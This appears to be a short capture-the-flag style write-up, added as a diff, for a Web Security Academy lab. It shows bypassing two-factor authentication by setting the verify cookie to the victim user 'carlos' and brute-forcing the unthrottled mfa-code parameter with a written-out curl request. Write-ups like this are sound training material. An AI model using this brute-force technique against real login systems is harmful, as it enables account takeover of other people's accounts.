@@ -1,0 +1,15 @@
+
+
+if we login with my account and see logs and after test post req to login and login2
+without session and change username to carlos
+you can't see any protection on 2FA code
+
+so bruteforce 2FA parameter on this req:
+
+curl -ik -X $'POST' \
+    -b $'verify=carlos' \
+    --data-binary $'mfa-code=1667' \
+    $'https://0a160010040a1657812993150055002e.web-security-academy.net/login2'
+	
+and this req give me a session Id and set in browser then we can login as carlos
+	
